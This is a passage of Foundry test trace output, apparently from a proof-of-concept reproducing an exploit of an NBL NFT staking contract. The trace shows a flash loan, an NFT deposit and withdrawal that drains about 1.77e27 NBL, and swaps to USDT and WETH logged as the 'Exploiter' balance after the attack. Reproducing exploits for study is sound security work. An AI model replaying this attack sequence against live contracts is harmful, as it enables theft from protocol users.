+    │   │   │   │   │   │   ├─ [46263] 0x770b279678105B378f90055aAd1B22D2a0306baF::deposit(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
+    │   │   │   │   │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 100)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0 → 0x0000000000000000000000000000000000000000000042d1ae38b6f9b480903d
+    │   │   │   │   │   │   │   │   @ 6: 668871 → 668971
+    │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 100
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ emit DepositNft(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 737)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b1: 0 → 737
+    │   │   │   │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b4: 0 → 0x0000000000000000000000000000000000000000000000000000000065b250d1
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 31: 257 → 1
+    │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x85d59c2be79578191f7f884f3512d37ea04978a46bea8a84f968d925ac8021c9: 2055 → 0
+    │   │   │   │   │   @ 0xe1eb72f1e4b69e1d3041a9adfb9baa0e2fc4087cddeabf988f56a68e6dc2876e: 2056 → 2055
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 1
+    │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 0 → 737
+    │   │   │   │   │   @ 0x36bbcd5dd4b4a3eb3d83c7edb559153922f1b132b70b36e31104f5a6ee4cdced: 737 → 0
+    │   │   │   │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x0000000000000000000000005499178919c79086fd580d6c5f332a4253244d91 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3094] NBL::transfer(0x3993e4d57fF30984912b09B330BC66656fb99E08, 0)
+    │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: 0x3993e4d57fF30984912b09B330BC66656fb99E08, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [5894] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000005baac879a092b0f03800000 → 0x00000000000000000000000000000000000000000b75590f3412561e07000000
+    │   │   │   │   │   @ 0x317d9a402d9335aaaab6b002e0b055f585d6b9972424e7617a06678512c4a200: 0x000000000000000000000000000000000000000005baac879a092b0f03800000 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [9314] 0x770b279678105B378f90055aAd1B22D2a0306baF::withdraw(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 800)
+    │   │   │   │   ├─ [563] NBL::balanceOf(0x770b279678105B378f90055aAd1B22D2a0306baF) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4225669381403254864930361008 [4.225e27]
+    │   │   │   │   ├─ [3094] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x770b279678105B378f90055aAd1B22D2a0306baF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdraw(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0x0000000000000000000000000000000000000000000042d1ae38b6f9b480903d → 0
+    │   │   │   │   │   @ 6: 668971 → 668871
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 100 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit WithdrawNft(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 737)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b4: 0x0000000000000000000000000000000000000000000000000000000065b250d1 → 0
+    │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b1: 737 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3094] NBL::transfer(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], 1778419300000000000000000000 [1.778e27])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], value: 1778419300000000000000000000 [1.778e27])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x49054eea6cae32f0b767113455ad5bda61e7a2c22212bf1a957858edb1643f49: 0x000000000000000000000000000000000000000000b8dcf107717329232d7800 → 0x00000000000000000000000000000000000000000677efe0762a42f4de3d7800
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000b75590f3412561e07000000 → 0x000000000000000000000000000000000000000005b6461fc55986524bf00000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [563] NBL::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   └─ ← [Return] 2001905017636981305249724416 [2.001e27]
+    │   ├─ [519] USDT::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   └─ ← [Return] 373170747826 [3.731e11]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], qty0: 1773100000000000000000000000 [1.773e27], qty1: 0, paid0: 5319300000000000000000000 [5.319e24], paid1: 0)
+    │   ├─  storage changes:
+    │   │   @ 1: 0x000000000000000000000000000c53f3284ec01c6a96c60ed3e7266c78945b6a → 0x000000000000000000000000000f505b2628c5a852e812848616adbaaa37c28d
+    │   └─ ← [Stop]
+    ├─ [563] NBL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1767780700000000000000000000 [1.767e27]
+    ├─ [105963] Router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x4B03afC91295ed778320c2824bAd5eb5A1d852DD, tokenOut: 0x94b008aA00579c1307B0EF2c499aD98a8ce58e58, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 1591002630000000000000000000 [1.591e27], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   ├─ [101067] NBL_USDT::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 1591002630000000000000000000 [1.591e27], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b4b03afc91295ed778320c2824bad5eb5a1d852dd000bb894b008aa00579c1307b0ef2c499ad98a8ce58e58000000000000000000000000000000000000000000)
+    │   │   ├─ [26242] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 164967658585 [1.649e11])
+    │   │   │   ├─ emit Transfer(from: NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 164967658585 [1.649e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x49054eea6cae32f0b767113455ad5bda61e7a2c22212bf1a957858edb1643f49: 0x00000000000000000000000000000000000000000000000000000056e2b5b9b2 → 0x0000000000000000000000000000000000000000000000000000003079df0559
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000000000002668d6b459
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [563] NBL::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   │   └─ ← [Return] 2001905017636981305249724416 [2.001e27]
+    │   │   ├─ [7631] Router::uniswapV3SwapCallback(1591002630000000000000000000 [1.591e27], -164967658585 [-1.649e11], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b4b03afc91295ed778320c2824bad5eb5a1d852dd000bb894b008aa00579c1307b0ef2c499ad98a8ce58e58000000000000000000000000000000000000000000)
+    │   │   │   ├─ [3554] NBL::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], 1591002630000000000000000000 [1.591e27])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], value: 1591002630000000000000000000 [1.591e27])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000005b6461fc55986524bf00000 → 0x000000000000000000000000000000000000000000923a366088f3d507980000
+    │   │   │   │   │   @ 0x49054eea6cae32f0b767113455ad5bda61e7a2c22212bf1a957858edb1643f49: 0x00000000000000000000000000000000000000000677efe0762a42f4de3d7800 → 0x00000000000000000000000000000000000000000b9bfbc9dafad57222957800
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [563] NBL::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   │   └─ ← [Return] 3592907647636981305249724416 [3.592e27]
+    │   │   ├─ emit Swap(sender: Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], deltaQty0: 1591002630000000000000000000 [1.591e27], deltaQty1: -164967658585 [-1.649e11], sqrtP: 602563567219659544131 [6.025e20], liquidity: 27181772145304453756 [2.718e19], currentTick: -373907 [-3.739e5])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcad176e812b5784032ef509da0d6ac812d457b00f96acd6e960218901905cff6: 0x0165a1d3810000000000000000000032f8db101316404bf5c0fffffe96e74d46 → 0x0100107d500000000000000000000ba4f08248a482808ab67fffffa490006c76
+    │   │   │   @ 4: 0x000000000000000000000000000000000000000000000001793bd7a301a53177 → 0x00000000000000000000000000000000000000000000000179390dc03e7ac27c
+    │   │   │   @ 8: 0x010000000000000000000bd7d65cf7ad435bf05f4cffffa32782766865b250b5 → 0x010000000000000000000bd7e95d58b798c0d6ac3fffffa326e7b9bc65b250d1
+    │   │   │   @ 1: 0x000000000000000000000000000f505b2628c5a852e812848616adbaaa37c28d → 0x0000000000000000000000000011fe4503dfda2fa5671644f8a330fac31205d8
+    │   │   │   @ 0: 0x000100000100010000fa794300000000000000000000003abb23d182a79be095 → 0x000100000100010000fa4b6d000000000000000000000020aa3fd3de20049643
+    │   │   │   @ 0xcad176e812b5784032ef509da0d6ac812d457b00f96acd6e960218901905cff4: 0x000000000000000000000000000387a5f4182732ddf3bc7dab66fd9271251f70 → 0x000000000000000000000000000cdc923264921fd1eb3142a05a0f08702e975f
+    │   │   │   @ 0xcad176e812b5784032ef509da0d6ac812d457b00f96acd6e960218901905cff5: 0x00000000000000000000000000000000000000004edc0d3ca34684fb7e1320b5 → 0x00000000000000000000000000000000000000007486d8d9b76a5c9156cbe08a
+    │   │   └─ ← [Return] 1591002630000000000000000000 [1.591e27], -164967658585 [-1.649e11]
+    │   └─ ← [Return] 164967658585 [1.649e11]
+    ├─ [563] NBL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 176778070000000000000000000 [1.767e26]
+    ├─ [94970] Router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x4B03afC91295ed778320c2824bAd5eb5A1d852DD, tokenOut: 0x4200000000000000000000000000000000000006, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 176778070000000000000000000 [1.767e26], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   ├─ [87545] 0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 176778070000000000000000000 [1.767e26], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b4b03afc91295ed778320c2824bad5eb5a1d852dd000bb84200000000000000000000000000000000000006000000000000000000000000000000000000000000)
+    │   │   ├─ [27701] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6900257340231423430 [6.9e18])
+    │   │   │   ├─ emit Transfer(from: 0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6900257340231423430 [6.9e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb5c929f9efa339350ea420247f5b372c4b0a7281964cf6b465a2830d5ec85240: 0x000000000000000000000000000000000000000000000000b4c8d0ed6fd0588c → 0x00000000000000000000000000000000000000000000000055062d6f8889c2c6
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000005fc2a37de74695c6
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2563] NBL::balanceOf(0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f) [staticcall]
+    │   │   │   └─ ← [Return] 156098545833245126700981180 [1.56e26]
+    │   │   ├─ [10461] Router::uniswapV3SwapCallback(-6900257340231423430 [-6.9e18], 176778070000000000000000000 [1.767e26], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b4b03afc91295ed778320c2824bad5eb5a1d852dd000bb84200000000000000000000000000000000000006000000000000000000000000000000000000000000)
+    │   │   │   ├─ [6354] NBL::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f, 176778070000000000000000000 [1.767e26])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f, value: 176778070000000000000000000 [1.767e26])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000923a366088f3d507980000 → 0
+    │   │   │   │   │   @ 0x263750f18de12c403788d43f1d028d55518c1ac605722528c55498267d50563f: 0x000000000000000000000000000000000000000000811f27202ea30bdcfa5bbc → 0x00000000000000000000000000000000000000000113595d80b796e0e4925bbc
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [563] NBL::balanceOf(0x64185ec6705f2Ed9F5F3f87f199BBF6B2f18706f) [staticcall]
+    │   │   │   └─ ← [Return] 332876615833245126700981180 [3.328e26]
+    │   │   ├─ emit Swap(sender: Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], deltaQty0: -6900257340231423430 [-6.9e18], deltaQty1: 176778070000000000000000000 [1.767e26], sqrtP: 584580554461406979800456233316498 [5.845e32], liquidity: 44998905112800211427274 [4.499e22], currentTick: 178135 [1.781e5])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x00000000000000000000000000000009556cce05f683c26202f380a295be324b → 0x000000000000000000000000000000151e82c5330d135336fce5e03b925177c7
+    │   │   │   @ 8: 0x0100000000000000000000014cc943f4981eb377c500001697200f3065b24899 → 0x0100000000000000000000014da611543e601151bb000016ab91070065b250d1
+    │   │   │   @ 0: 0x000100000100010000027cb60000000000000d85bb7694b79f1c5fb347fd44a6 → 0x00010000010001000002b7d70000000000001cd271a5203fe8d1642e49457092
+    │   │   └─ ← [Return] -6900257340231423430 [-6.9e18], 176778070000000000000000000 [1.767e26]
+    │   └─ ← [Return] 6900257340231423430 [6.9e18]
+    ├─ [519] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 164967658585 [1.649e11]
+    ├─ [400] USDT::decimals() [staticcall]
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Exploiter USDT balance after attack", val: 164967658585 [1.649e11], decimals: 6)
+    ├─ [457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 6900257340231423430 [6.9e18]
+    ├─ [336] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 6900257340231423430 [6.9e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.97s (6.08s CPU time)
+
+Ran 1 test suite in 10.81s (6.97s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
